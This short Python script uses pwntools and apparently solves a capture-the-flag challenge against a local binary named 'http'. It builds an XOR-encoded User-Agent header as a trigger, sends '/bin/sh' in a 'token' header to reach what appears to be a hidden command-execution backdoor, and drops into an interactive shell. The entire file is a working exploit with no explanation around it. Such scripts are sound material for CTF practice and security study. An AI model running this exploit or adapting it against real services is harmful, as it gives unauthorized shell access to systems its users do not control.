from pwn import *
from sys import *
#context.log_level = 'debug'
p = process('http')

s = "useragent"
buf = ""
cmd = "/bin/sh" #argv[1]
for i in range(len(s)):
    buf += chr(ord(s[i])^i)

payload =  "User-Agent: %s\r\n" % buf
payload += "token: %s\r\n\r\n" % cmd

p.send(payload)
p.recvuntil('\r\n\r\n')
p.interactive()
